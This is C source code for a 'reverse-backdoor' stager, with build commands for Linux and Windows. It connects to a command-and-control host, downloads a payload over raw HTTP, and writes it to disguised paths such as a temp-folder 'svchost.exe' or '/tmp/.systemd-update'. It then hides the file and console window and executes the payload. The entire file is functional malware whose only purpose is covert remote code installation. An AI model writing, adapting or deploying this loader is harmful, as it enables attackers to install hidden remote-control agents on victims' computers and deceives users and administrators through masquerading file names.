/*
 * reverse-backdoor C-stager — minimal stage downloader + executor
 * Downloads Python agent from C2 server, writes to temp, executes.
 *
 * Build (cross-platform):
 *   Linux:   gcc -O2 -s -o stager stager.c -DSTAGE_HOST=\"10.0.0.1\" -DSTAGE_PORT=8080
 *   Windows: x86_64-w64-mingw32-gcc -O2 -s -o stager.exe stager.c -DSTAGE_HOST=\"10.0.0.1\" -DSTAGE_PORT=8080 -lws2_32 -lwininet
 *
 * Default build without macros: connects to 127.0.0.1:5555 via raw socket.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifndef STAGE_HOST
#define STAGE_HOST "127.0.0.1"
#endif
#ifndef STAGE_PORT
#define STAGE_PORT 5555
#endif

#define BUF_SIZE 8192
#define MAX_PAYLOAD (20 * 1024 * 1024)

#ifdef _WIN32
  #define WIN32_LEAN_AND_MEAN
  #include <windows.h>
  #include <winsock2.h>
  #include <ws2tcpip.h>
  #pragma comment(lib, "ws2_32.lib")
  typedef SOCKET socket_t;
  #define CLOSE_SOCK(s) closesocket(s)
#else
  #include <unistd.h>
  #include <sys/socket.h>
  #include <arpa/inet.h>
  #include <netdb.h>
  #include <sys/stat.h>
  typedef int socket_t;
  #define CLOSE_SOCK(s) close(s)
#endif

static const char *STAGE_PATH(void) {
#ifdef _WIN32
    static char path[MAX_PATH];
    char tmp[MAX_PATH];
    GetTempPathA(sizeof(tmp), tmp);
    snprintf(path, sizeof(path), "%s\\svchost.exe", tmp);
    return path;
#else
    static char path[256];
    snprintf(path, sizeof(path), "/tmp/.systemd-update");
    return path;
#endif
}

/* ── HTTP download via raw socket ──────────────────────── */

static int http_get(const char *host, int port, const char *path,
                     unsigned char **out, long *out_len) {
    socket_t s = -1;
    int ret = 0;

#ifdef _WIN32
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 0;
#endif

    struct addrinfo hints, *res;
    char port_str[16];
    snprintf(port_str, sizeof(port_str), "%d", port);
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(host, port_str, &hints, &res) != 0) return 0;
    for (struct addrinfo *p = res; p; p = p->ai_next) {
        s = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (s == -1) continue;
        if (connect(s, p->ai_addr, p->ai_addrlen) == 0) break;
        CLOSE_SOCK(s); s = -1;
    }
    freeaddrinfo(res);
    if (s == -1) return 0;

    /* Send HTTP request */
    char req[1024];
    int req_len = snprintf(req, sizeof(req),
        "GET %s HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n",
        path, host);
#ifdef _WIN32
    if (send(s, req, req_len, 0) != req_len) { CLOSE_SOCK(s); return 0; }
#else
    if (send(s, req, req_len, MSG_NOSIGNAL) != req_len) { CLOSE_SOCK(s); return 0; }
#endif

    /* Read response */
    unsigned char *buf = (unsigned char *)malloc(MAX_PAYLOAD);
    if (!buf) { CLOSE_SOCK(s); return 0; }
    long total = 0;
    char tmp[BUF_SIZE];
    int header_done = 0;

    while (total < MAX_PAYLOAD) {
        int n = recv(s, tmp, sizeof(tmp) - 1, 0);
        if (n <= 0) break;
        if (!header_done) {
            /* Find \r\n\r\n */
            char *body = strstr(tmp, "\r\n\r\n");
            if (body) {
                body += 4;
                int body_len = n - (int)(body - tmp);
                if (body_len > 0 && total + body_len < MAX_PAYLOAD) {
                    memcpy(buf + total, body, body_len);
                    total += body_len;
                }
                header_done = 1;
            }
            /* If header not found in this chunk, skip it */
        } else {
            if (total + n < MAX_PAYLOAD) {
                memcpy(buf + total, tmp, n);
                total += n;
            }
        }
    }
    CLOSE_SOCK(s);

    if (total > 0) {
        *out = buf;
        *out_len = total;
        ret = 1;
    } else {
        free(buf);
    }
    return ret;
}

/* ── Write + Execute ───────────────────────────────────── */

static int write_and_run(const unsigned char *data, long len, const char *target_path) {
    FILE *fp = fopen(target_path, "wb");
    if (!fp) return 0;
    size_t written = fwrite(data, 1, len, fp);
    fclose(fp);
    if (written != (size_t)len) {
        remove(target_path);
        return 0;
    }

#ifdef _WIN32
    SetFileAttributesA(target_path, FILE_ATTRIBUTE_HIDDEN);
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (CreateProcessA(NULL, (LPSTR)target_path, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }
#else
    chmod(target_path, 0755);
    pid_t pid = fork();
    if (pid == 0) {
        execl(target_path, target_path, NULL);
        _exit(1);
    }
    return pid > 0;
#endif
    return 0;
}

/* ── Main ──────────────────────────────────────────────── */

int main(void) {
    const char *host = STAGE_HOST;
    int port = STAGE_PORT;

#ifdef _WIN32
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);
#endif

    unsigned char *payload = NULL;
    long payload_len = 0;

    if (!http_get(host, port, "/stage", &payload, &payload_len)) {
        return 1;
    }

    if (!write_and_run(payload, payload_len, STAGE_PATH())) {
        free(payload);
        return 1;
    }

    free(payload);
    return 0;
}
